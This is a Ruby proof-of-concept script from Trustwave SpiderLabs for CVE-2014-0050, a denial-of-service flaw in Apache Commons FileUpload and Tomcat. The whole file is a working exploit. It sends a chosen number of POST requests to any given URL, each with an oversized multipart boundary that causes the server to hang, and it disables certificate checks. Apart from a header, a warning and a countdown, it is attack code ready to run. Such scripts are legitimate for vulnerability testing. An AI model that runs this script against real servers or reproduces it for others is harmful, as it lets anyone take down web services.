#################################################################################
# CVE-2014-0050 Apache Commons FileUpload and Apache Tomcat Denial-of-Service	#
# 																				#
# Author: Oren Hafif, Trustwave SpiderLabs Research								#
# This is a Proof of Concept code that was created for the sole purpose 		#
# of assisting system administrators in evaluating whether their applications 	#
# are vulnerable to this issue or not											#
#  																				#
# Please use responsibly.														#
#################################################################################


require 'net/http'
require 'net/https'
require 'optparse'
require 'openssl'


options = {}

opt_parser = OptionParser.new do |opt|
  opt.banner = "Usage: ./CVE-2014-0050.rb [OPTIONS]"
  opt.separator  ""
  opt.separator  "Options"
  opt.on("-u","--url URL","The url of the Servlet/JSP to test for Denial of Service") do |url|
    options[:url] = url
  end

  opt.on("-n","--number_of_requests NUMBER_OF_REQUSETS","The number of requests to send to the server. The default value is 10") do |number_of_requests|
    options[:number_of_requests] = number_of_requests
  end

  opt.on("-h","--help","help") do
  	puts ""
    puts "#################################################################################"
	puts "# CVE-2014-0050 Apache Commons FileUpload and Apache Tomcat Denial-of-Service   #"
	puts "#                                                                               #"
	puts "# Author: Oren Hafif, Trustwave SpiderLabs Research                             #"
	puts "# This is a Proof of Concept code that was created for the sole purpose         #"
	puts "# of assisting system administrators in evaluating whether or not               #"
	puts "# their applications are vulnerable to this issue.                              #"
	puts "#                                                                               #"
	puts "# Please use responsibly.                                                       #"
	puts "#################################################################################"
    puts ""
    puts opt_parser
    puts ""
  
	exit
  end
end

opt_parser.parse!


uri = ""
begin
	uri = URI.parse(options[:url])
rescue Exception => e
	puts ""
	puts "ERROR: Invalid URL was entered #{options[:url]}"
	puts ""
    puts opt_parser
    exit
end

number_of_requests = 10;
if(options[:number_of_requests] != nil)
	begin
		number_of_requests = Integer( options[:number_of_requests] )
		throw Exception.new if number_of_requests <= 0 
	rescue Exception => e
		puts e
		puts ""
		puts "ERROR: Invalid NUMBER_OF_REQUSETS was entered #{options[:number_of_requests]}"
		puts ""
	    puts opt_parser
	    exit
	end
end

#uri = URI.parse(uri)


puts ""
puts "WARNING: Usage of this tool for attack purposes is forbidden - press Ctrl-C now to abort..."
i=10
i.times { print "#{i.to_s}...";sleep 1; i-=1;}
puts ""


number_of_requests.times do 
	begin
	puts "Request Launched"
	https = Net::HTTP.new(uri.host,uri.port)
	https.use_ssl = uri.scheme=="https"
	https.verify_mode = OpenSSL::SSL::VERIFY_NONE
	req = Net::HTTP::Post.new(uri.path)
	req.add_field("Content-Type","multipart/form-data; boundary=#{"a"*4092}")
	req.add_field("lf-None-Match","59e532f501ac13174dd9c488f897ee75")
	req.body = "b"*4097
	https.read_timeout = 1 
	res = https.request(req)
	rescue Timeout::Error=>e
		puts "Timeout - continuing DoS..."
	rescue Exception=>e
		puts e.inspect
	end
end